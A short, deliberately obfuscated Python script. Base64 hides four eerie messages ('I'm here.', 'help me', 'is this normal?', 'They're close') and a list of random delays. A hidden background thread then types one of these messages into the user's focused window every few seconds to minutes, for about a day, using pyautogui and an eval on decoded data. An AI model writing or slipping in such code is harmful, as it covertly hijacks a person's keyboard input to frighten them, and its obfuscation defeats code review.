import time as _t, random as _r, threading as _th, base64 as _b
import pyautogui as _pg

_m = [b'SSdtIGhlcmUu', b'aGVscCBtZQ==', b'aXMgdGhpcyBub3JtYWw/', b'VGhleSdyZSBjbG9zZQ==']
_i = _b.b64decode(b'WzUsMzAsNDAsNTAsNjAsMTIwLDE4MF0=')
def _f():
 while 1:
  _t.sleep(_r.choice(eval(_i.decode())))
  _pg.typewrite(_b.b64decode(_r.choice(_m)).decode(), interval=0.2)

_th.Thread(target=_f, daemon=True).start()
_t.sleep(99999)
